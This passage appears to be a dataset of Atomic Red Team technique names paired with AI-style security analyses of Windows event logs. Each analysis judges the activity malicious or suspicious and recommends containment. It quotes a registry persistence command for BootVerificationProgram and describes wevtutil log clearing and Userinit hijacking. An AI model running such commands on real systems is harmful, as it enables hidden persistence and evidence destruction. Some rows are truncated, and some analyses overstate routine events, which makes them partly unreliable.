  2. Conduct a full forensic analysis of the system to identify any additional signs of compromise and to understand the impact.

- **Security Improvements:**
  1. Audit user accounts and access logs to ensure no further compromise of administrative credentials.
  2. Implement stricter access controls and logging policies, ensuring log files are not easily cleared without proper authorization.

- **Ongoing Monitoring:**
  1. Set up alerts for log clearing events and unusual command-line executions on critical systems.
  2. Monitor the use of administrative tools (`wevtutil`, registry editors) for unauthorized use. 

This case must be treated with urgency due to the ongoing risk to the network infrastructure."
Azure - adding service principal to Azure role in subscription,"Upon careful analysis of the provided Windows event logs, several potential indicators of suspicious activity have been identified. Below is a detailed analysis:

### Suspicious or Anomalous Behavior:
1. **PowerShell Execution:**
   - The PowerShell logs reveal a complex script involving Azure operations, such as importing Azure resources, creating a secure password string, and connecting to an Azure account using these credentials. The script checks for an Azure Active Directory Service Principal and Subscription, and assigns a ""Reader"" role to the Service Principal.
   - Such PowerShell activity, especially involving credential handling and Azure role assignments, can be leveraged for unauthorized access to cloud resources if executed maliciously.

2. **Log Clearning Events:**
   - Security EventID 1102: The event logs show that the Security log was cleared by a user named `admin_test`, a concerning action often taken to hide malicious activity.
   - System EventID 104: Similarly, System logs were also cleared by `admin_test`, which further supports the intention to obscure evidence of potentially malicious activities.

3. **Sysmon Events:**
   - Multiple instances of the `wevtutil.exe` process are seen, used to clear logs (Sysmon EventID 1 and 5). The parent process of these `wevtutil` executions is `wsmprovhost.exe`, suggesting possible automated or scripted actions to manipulate log files.

4. **Miscellaneous Security Events:**
   - A series of Security EventID 4798 logs indicate enumeration of local groups and domain accounts on the system. The process responsible for this is `CompatTelRunner.exe`, which is typically a legitimate Windows telemetry process, but in this context could be a sign of privilege or user account enumeration.

5. **Privileged Operations:**
   - Security EventID 4672 indicates that special privileges were assigned to a user (`SYSTEM`), including significant privileges like `SeDebugPrivilege`, which enables code injection into any process, and `SeTcbPrivilege`, often referred to as ""Act as part of the OS"".

### Potential Indicators of Malicious Activity:
- The combination of credentials being manipulated within PowerShell scripts, log files being cleared, and system processes being manipulated suggests a high likelihood of malicious actions.
- The `admin_test` account is linked to several of these suspicious activities, suggesting either a compromise of this account or malicious intent from its user.

### Threat Assessment:
The described actions align with tactics commonly used by attackers to maintain stealth, gain unauthorized access, and potentially deploy further attacks. These include obfuscating logs to hide tracks and using legitimate tools for malicious purposes (Living off the Land attacks).

### Guidance on How to Proceed:
1. **Immediate Isolation and Investigation:**
   - Isolate the affected system (Server002) to prevent further action or data exfiltration.
   - Conduct a thorough forensic analysis, focusing on the activities of the `admin_test` account and the PowerShell scripts executed.
   
2. **Credential Changes and Monitoring:**
   - Reassess and change credentials for sensitive accounts, especially `admin_test`.
   - Implement enhanced monitoring of all administrative and privileged account activities.

3. **Review Azure Activity:**
   - Check Azure activity logs to determine if any unauthorized changes or access have been made using the credentials in the PowerShell script.

4. **Secure and Harden Systems:**

   - Reinforce security policies, especially around log retention and auditing.

### Resolution:
**MALICIOUS** - The logs presented contain definitive activities that align with unauthorized access and obfuscation tactics, indicating a compromise. Immediate action and further investigation are warranted."
TinyTurla backdoor service w64time,"### Analysis of Windows Event Logs:

Upon reviewing the provided event logs, several indicators of potentially malicious activity associated with the user ""admin_test"" on ""Server002"" have been identified. Here's a detailed breakdown:

1. **Log File Clearing:**
   - **Security Log**: Event ID 1102 - The Security log file was cleared by ""admin_test"". This is a significant indicator of malicious intent, as attackers often clear logs to cover their tracks.
   - **System Log**: Event IDs 104 and the presence of `wevtutil.exe` clearing logs for System and Windows PowerShell channels, also suggest activity aimed at removing evidence of actions performed on the system.

2. **Privilege Escalation and Sensitive Privilege Use:**
   - **Security Log**: Event ID 4672 - ""admin_test"" was granted a series of high-privilege rights including `SeDebugPrivilege`, `SeBackupPrivilege`, and others. The use of these privileges could be associated with activities like process injection or altering software behavior for persistence or stealth.

3. **Process Creation and Command Execution:**
   - **Sysmon Log**: Multiple instances capturing the execution of `cmd.exe`, `sc.exe`, and `svchost.exe` with unusual command-line parameters to manipulate services (Event IDs: various). The creation of a new service `W64Time` with a crafted path and DLL replacement (`w64time.dll`) using a temporary directory is highly suspect and indicative of a persistence mechanism usually employed in malicious activities.
   
4. **Time Tampering:**
   - **Security/System Log**: Event IDs 4616 and the `Kernel-General` events indicate brief time adjustments. Time manipulation could be used to disrupt log timelines, another indicator often associated with malicious activities.

5. **Network-related Events:**
   - Although not directly highlighted in these logs, the presence of `NtLmSsp` for Network Logon (Event ID 4624) could imply lateral movement or suspicious remote login.

### Threat Assessment:
The combination of log clearing, high-privilege role assignments, unusual service creation, and potential persistence methods (altering system services with suspicious binaries) strongly suggests a malicious activity on ""Server002"" by ""admin_test"". The logs show evidence of a behavior pattern common in Post-exploitation techniques.

### Resolution: MALICIOUS

### Recommendations:

Create shortcut to cmd in startup folders,"### Detailed Analysis:

Upon reviewing the provided logs from multiple sources (Application, Sysmon, System, Windows PowerShell, and Security), several events and actions indicate potentially malicious activity:

1. **Windows PowerShell logs and Sysmon logs:**
   - There is a suspicious use of PowerShell (EventID 1043-1050 in PowerShell logs and 17977 in Sysmon) to create shortcut links in startup directories in both user and program data paths, utilizing the Shell COM object. This is indicative of persistence mechanisms being set up (T1547.009 in MITRE ATT&CK framework which involves ""Hijack Execution Flow: Shortcut Modification""). Such entries are created in places that would allow the execution of potentially malicious scripts or executables upon user login.

2. **Log Clearances:**
   - The System, Windows PowerShell, and Security event logs show evidence that logs have been cleared (EventIDs 104, 104, 1102 respectively). This action is often performed by an attacker to cover their tracks after executing commands, especially following command execution using PowerShell as seen in the logs (e.g., EventRecordID 3566, 3567 in System log and EventID 1102 in Security log).

3. **Unusual Use of Utilities:**
   - Sysmon records show the execution of ""wevtutil.exe"" to clear log files across channels such as System and Security (Event IDs: 17949-17958). This utility usage again aligns with potential malicious behavior to remove traces of activity.

4. **Time Manipulation Events:**
   - Security and System logs indicate an unusual manipulation of the system time using svchost.exe (EventIDs 4616 in Security logs and 1 in System logs). Tampering with system time could be used to align other activities in log entries or evade time-based security configurations.

5. **High Integrity Levels:**
   - According to Sysmon logs, many process executions occur at a high integrity level, particularly those related to PowerShell and whoami.exe executions. This suggests the processes were likely executed with elevated privileges (e.g. EventID 17945-17974), often necessary for successful persistence and log manipulation.

6. **Automation and Scheduled Tasks Indicators:**
   - Multiple instances of Microsoft EdgeUpdate processes running with different command-line arguments suggest automated scheduled tasks, possibly manipulated (e.g., EventID 17993-18008 in Sysmon log). While these could also result from legitimate update processes, comprohensive anomaly checks are essential.

### Assessment:
- The behavior observed in the logs indicates a strong likelihood of malicious activity. The combination of log clearance, suspicious PowerShell usage for creating persistence mechanisms, and utility misuse for log clearing, paired with suspicious system time changes, points toward a potential compromise.

### Resolution:
**MALICIOUS**
- These activities fit a pattern of typical adversary behavior attempting to gain persistence and cover tracks.

### Recommended Actions:
1. **Immediate Containment:**
   - Isolate the affected system (Server002) from the network to prevent any further exfiltration of data or movement through the network by potential adversaries.

2. **Incident Response:**
   - Initiate a full incident response plan, complete with forensic investigation and further threat hunting in the network to identify additional compromised systems.

3. **Log Recovery & Analysis:**
   - Employ backups to restore the cleared logs or analyze the logs remotely if possible. Look for correlational patterns in other systems' logs.

4. **Comprehensive Audit:**
   - Review and audit user accounts, privileges, and recent changes. Verify the creation of unexpected user accounts or modifications to existing privileges.

5. **Implement Mitigations:**
   - Tighten PowerShell script execution policies and employ AppLocker or similar toolsets for process execution restrictions.
   - Increase the robustness of logging to include detailed record-keeping of privileged operations.

6. **User Awareness and Training:**
   - Educate organizational users about phishing and social engineering to avoid initial vector compromises.

By addressing these points, you can prevent recurrence and manage current incidents effectively."

The logs provided show evidence of potentially malicious activity on the Windows host, specifically related to the use of PowerShell and the manipulation of registry entries associated with the Windows Time Service.

#### Suspicious Behavior Noted:
1. **PowerShell Execution**: 
   - Multiple PowerShell events indicate the execution of a command that attempts to replace the DLL used by the Windows Time Service with `AtomicTest.dll`.
   - The PowerShell command includes registry modifications to add the new DLL and enable it.

2. **Use of `reg.exe` and `net.exe`**:
   - Several commands involving `reg.exe` are used to modify the registry keys related to the Windows Time Service (`W32Time`), specifically the `NtpServer` settings.
   - Commands involve stopping and starting the `w32time` service, which could be an attempt to reload the service with the newly injected DLL.

3. **Security and System Log Clearances**:
   - Event ID `1102` in the Security Log and Event ID `104` in the System Log indicate that logs have been cleared, which is often a red flag indicating an attempt to cover tracks.
   - Clearing logs is a common tactic used by attackers to make forensic analysis more difficult.

4. **Execution Integrity Level**:
   - The processes involved (including PowerShell) are running with high integrity levels, indicating privileged access likely by an administrative user.

5. **Event ID `4`** from the System Log:
   - The time provider (`NtpServer`) failed to start, and the error message states `The specified module could not be found`, which aligns with the where a legitimate module has been tampered or replaced.

6. **AtomicRedTeam Reference**:
   - The reference to `AtomicRedTeam` as part of the file path and DLL name suggests that a technique from the Red Team toolset (which simulates attacker behavior) was being employed, potentially as a test or exploit.

### Conclusion:
The combination of registry modifications, service manipulations, PowerShell script executions, and log clearance suggests a severe indicator of an attempted persistence mechanism or an exploit, likely involving a technique that grants persistence through system service alterations.

Modify HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig Security Support Provider configuration in registry,"Based on the analysis of the provided logs, some critical observations and anomalies have been identified:

1. **PowerShell Execution with Suspicious Command**: A PowerShell script was executed that modifies a registry key: `HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig`, changing 'Security Packages' to include `AtomicTest.dll`. This behavior is typically used by attackers for persistence or privilege escalation by injecting a malicious DLL into the security packages used by Windows.

2. **Clearance of Event Logs**: Logs from the System, Security, and Windows PowerShell channels were cleared (`EventID: 1102`, `Log cleansing`): This is often a tactic used by attackers to cover their tracks post-compromise and is highly suspicious.

3. **Unusual Usage of `wevtutil`**: The `wevtutil.exe cl` command was used multiple times to clear Windows event logs like Sysmon and Application logs, indicating an attempt to erase evidence of activities.

4. **Execution of Windows Host Process Checking Utilities (`whoami.exe`, `hostname.exe`)**: While these are legitimate utilities, their execution in suspicious contexts can indicate reconnaissance to understand the compromised environment.

5. **Frequent Execution of Microsoft Edge Update Process**: Observations of repeated executions of `MicrosoftEdgeUpdate.exe` with varying command-line arguments. While Edge updates are legitimate processes, their excessive launching in a short period can be exploitable if not according to normal behavior.

6. **Registry Manipulation and Execution of Shell Processes**: The PowerShell commands and clearing of logs reflect potential post-exploitation activities aimed at achieving persistence and evading detection.

7. **Integrity Level**: The processes, including PowerShell, were executed with high integrity levels indicating potential privilege escalation attempts.

**Assessment of the Situation**:
There are clear indicators of compromise within these logs. The registry modification to include a potentially malicious DLL, combined with the clearing of several critical event logs, suggests that malicious activity has occurred on the host. These actions point towards an attempted or ongoing attack intended to gain persistence and cover its tracks.

HKLM - Append Command to Winlogon Userinit KEY Value,"After analyzing the provided Windows event logs, here is a detailed assessment of the situation:

### Analysis:

1. **Event Log Clearing**:
   - The logs show multiple instances of the `wevtutil.exe` command being used to clear event logs (`System`, `Security`, and `Windows PowerShell` channels). These actions are logged in both the System and Security logs as Event ID 104 and 1102, respectively. The clearing of logs is performed by the user `admin_test` with high integrity, indicating administrative access.
   - This behavior is highly suspicious, as clearing event logs can be an attempt to cover up unauthorized or malicious activity.

2. **Suspicious PowerShell Activity**:
   - There is a PowerShell activity that modifies the registry key associated with `Userinit`, appending the execution of `calc.exe`. This is found in the Windows PowerShell event log and captured by Sysmon as well.
   - Modifying the `Userinit` registry key is a common persistence technique used by attackers to execute malicious code upon user login.

3. **Process Execution**:
   - Several processes like `wevtutil.exe`, `conhost.exe`, and `whoami.exe` are executed by `admin_test`. The `wevtutil.exe` processes match the timestamps of the log clearing events, providing further evidence that `admin_test` is responsible.
   - Normal administrative tools like `whoami.exe` and `hostname.exe` being executed give context but combined with the other suspicious activities, they can imply system probing or reconnaissance.

4. **Normal System Operations**:
   - The logs also include activities related to software updates (such as `Microsoft Edge Installer`). These appear routine and involve the `NT AUTHORITY\SYSTEM` account. While they are not directly related to the suspicious activities, they give a baseline for expected system behavior.

### Conclusion:

Based on the above analysis, there are clear indicators of potential malicious activity related to both log clearing and unauthorized registry modifications. 

- **Clearing event logs** is a known tactic for covering tracks after performing unauthorized actions, and in conjunction with **modifying the `Userinit` key**, it strongly suggests malicious behavior.
  
- **Resolution:** **MALICIOUS**

### Guidance:

1. **Immediate Actions**:
   - Isolate the affected system (Server002) from the network to prevent further damage or propagation.
   - Reset the `Userinit` registry key to its default value to prevent the execution of unauthorized code upon login.
   - Conduct a comprehensive malware scan on the system to identify and mitigate any additional threats.

2. **Further Investigations**:
   - Perform a forensic analysis of the timeline and context around the suspicious events, including `admin_test`'s activity, to understand the full extent of the compromise.
   - Review other systems within the environment for similar indicators of compromise.
   - Assess the configuration and security posture of privileged accounts, particularly focusing on any misconfigurations that allowed this activity.

3. **Preventive Measures**:

"
Azure AD Application Hijacking - Service Principal,"Upon reviewing the provided Windows event logs, several patterns of behavior suggest suspicious activity which needs further investigation.

### Analysis:
1. **Event Log Clearing:**
   - Multiple instances of event log clearing operations were performed using `wevtutil.exe` by the user `SERVER002\admin_test`. This includes clearing of the Security, System, and Windows PowerShell logs. This behavior often indicates an attempt to cover tracks by removing forensic evidence of previous actions.

2. **PowerShell Activities:**
   - The PowerShell logs indicate the execution of a script that performs several high-sensitivity actions:
     - Loading the AzureAD module.
     - Storing credentials in a secure string and establishing a connection to AzureAD.
     - Fetching and manipulating service principals, and generating a self-signed certificate for potential unauthorized access. 
     - These actions are indicative of potential privilege escalation or credential abuse, possibly pointing toward an application hijack attempt.

3. **Atomic Red Team References:**
   - The script references ""Atomic Test"" which is often related to Atomic Red Team tests. These tests simulate attack techniques often used by adversaries. However, without a verification in the environment policies that this is sanctioned testing, it should be treated as suspicious.

4. **Sysmon Logs:**
   - Several process creation events were logged involving `wevtutil.exe`, `powershell.exe`, and `hostname.exe`, some initiated from the `wsmprovhost.exe` process likely indicating remote commands being sent via Windows Remote Management (WinRM), used often in lateral movement strategies.

### Assessment:
- The activity, such as log clearance using `wevtutil` and PowerShell operations involving AzureAD connections and creating self-signed certificates, are strong indicators of potential malicious activity aimed at credential access, persistence, and defense evasion.
- Given the context, the mention of Atomic Red Team could imply this is a simulated attack for penetration testing, however, this should only be confirmed through organizational policy or directly with IT/security management.
  
### Threats/Risks Identified:
- Potential compromise of the user associated with the `SERVER002\admin_test` account.
- Unauthorized access to Azure AD resources.
- Attempts to cover tracks through log clearing.

  - If unauthorized, proceed to isolate the affected machine and conduct a thorough incident response investigation to identify how the account was compromised.
  - Examine authentication logs to see if the user account was misused across other systems.

- **Preventative Actions:**
  - Implement stricter monitoring and alerting for `wevtutil` and PowerShell script activity.
  - Conduct a review and audit of all user accounts and permissions, particularly focusing on accounts with administrative access.

### Resolution:
**SUSPICIOUS** - The logs contain activities that appear suspicious and potentially malicious. Further investigation is required to verify whether these were part of an authorized penetration test or an actual security incident."
Creating Boot Verification Program Key for application execution during successful boot,"Upon analyzing the provided Windows event logs, several activities stand out as suspicious and potentially indicative of malicious behavior:

### Suspicious and Anomalous Behavior:
1. **Log File Clearing:**
   - Multiple log file clearance events are recorded in the logs, specifically:
     - EventID 104 in the **System log** indicates that both System and Windows PowerShell logs were cleared by the user `admin_test`.
     - EventID 1102 in the **Security log** shows that the security log was cleared by the same user.
   - The execution of commands to clear logs is a common tactic used by malicious actors to cover their tracks.

2. **Unusual Command Execution:**
   - In the **Sysmon log**, there are multiple entries related to the use of `wevtutil.exe`:
     - Command-line arguments indicate the use of `wevtutil.exe cl`, which clears the logs. This behavior aligns with the suspicious clearing of logs mentioned above.
   - In the **Sysmon log**, there is an entry for `cmd.exe` executing a registry modification command:
     - The command `cmd.exe /c reg add HKLM\\System\\CurrentControlSet\\Control\\BootVerificationProgram /v ImagePath /t REG_SZ /d ""C:\\Program Files\\Internet Explorer\\iexplore.exe""` is unusual and indicative of potential persistence mechanism creation.

3. **Privilege Escalation:**
   - EventID 4672 in the **Security log** indicates that the account `admin_test` was granted several high-level privileges, including `SeDebugPrivilege`, `SeRestorePrivilege`, and `SeBackupPrivilege`. These privileges could be used for a range of malicious activities.

4. **System Time Change:**
   - EventID 4616 from **Security log** indicates a change in system time. Altering system time can be another indicator to shift logs' timestamps, potentially obfuscating malicious activity timelines.

### Assessment:
The logs indicate a clear sequence of activities that are not consistent with normal administrative operations and are likely indicative of malicious intent. The pattern includes log clearance, potential persistence setup, and privilege escalation. The account `admin_test` is central to these activities, suggesting it could be compromised or misused.

### Threats and Risks Identified:
- Clearing security logs is a significant red flag as it suggests attempts to erase evidence of unauthorized actions.
- Use of `wevtutil.exe` in clearing logs explicitly points towards attempts to hide tracks.
- Registry modifications could imply attempts at persistence or the execution of unauthorized applications.
- High-level privileges obtained may grant an attacker extensive control over the system.

### Guidance and Recommendations:
1. **Immediate Action:**
   - Initiate an investigation into the `admin_test` account. Ensure it is not being misused or has not been compromised.
   - Review and analyze related systems and user accounts for similar suspicious activities.
   - Consider isolating the affected system (Server002) from the network until a thorough investigation is conducted.

2. **Long-term Recommendations:**
   - Implement stricter access controls and monitor administrative activities closely.
   - Enable detailed logging and alerting mechanisms for sensitive operations like log clearing and privilege escalation.
   - Educate users on recognizing suspicious activities to prevent social engineering attacks that could lead to unauthorized access.

### Resolution:
Given the evidence of log clearing, privilege escalation, and potential persistence mechanisms being setup, the activity in these logs should be categorized as **MALICIOUS**. Steps should be taken to address the potential breach and secure the environment."
